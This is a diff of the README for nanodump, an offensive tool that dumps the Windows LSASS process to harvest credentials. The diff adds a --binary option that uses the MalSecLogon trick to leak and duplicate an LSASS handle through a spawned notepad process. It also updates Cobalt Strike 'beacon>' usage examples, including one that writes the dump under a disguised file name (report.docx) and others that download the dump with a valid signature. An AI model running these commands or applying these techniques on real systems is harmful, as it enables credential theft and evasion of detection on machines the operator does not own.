@@ -92,13 +92,24 @@ List all the handles in the system and look for an existing handle to LSASS. If 
 
 #### --seclogon -sl
 Leak a handle to LSASS by abusing SecLogon with `CreateProcessWithLogonW`. This eliminates the need to open a new handle to LSASS directly.  
-**If used as BOF, an unsigned binary will be written to disk!**
+**If used as BOF, an unsigned binary will be written to disk unless --dup is also provided!**
+
+#### --binary -v < path >
+Path to a binary such as `C:\Windows\notepad.exe`.  
+This option is used exclusively with `--seclogon` and `--dup`. If used, nanodump will create that process and use MalSecLogon to leak an LSASS handle in it. Then, it will duplicate that handle and use it to access LSASS.  
+The created process is then terminated automatically.
+
 
 ## Examples
 
-Read LSASS indirectly by creating a fork and write the dump to disk with a valid signature:
+Read LSASS indirectly by creating a fork and write the dump to disk with an invalid signature:
 ```
-beacon> nanodump --fork --write C:\lsass.dmp --valid
+beacon> nanodump --fork --write C:\lsass.dmp
+```
+
+Use MalSecLogon to leak an LSASS handle in a notepad process, duplicate that handle to get access to LSASS, then read it indirectly by creating a fork and download the dump  with a valid signature:
+```
+beacon> nanodump --seclogon --dup --fork --binary C:\Windows\notepad.exe --valid
 ```
 
 Get a handle with MalSecLogon, read LSASS indirectly by using a fork and download the dump with a valid signature:
@@ -111,14 +122,14 @@ Download the dump with an invalid signature (default):
 beacon> nanodump
 ```
 
-Get the PID of LSASS:
-```
-beacon> nanodump --getpid
-```
-
 Duplicate an existing handle and write the dump to disk with an invalid signature:
 ```
 beacon> nanodump --dup --write C:\Windows\Temp\report.docx
+```
+
+Get the PID of LSASS:
+```
+beacon> nanodump --getpid
 ```
 
 ## HTTPS redirectors
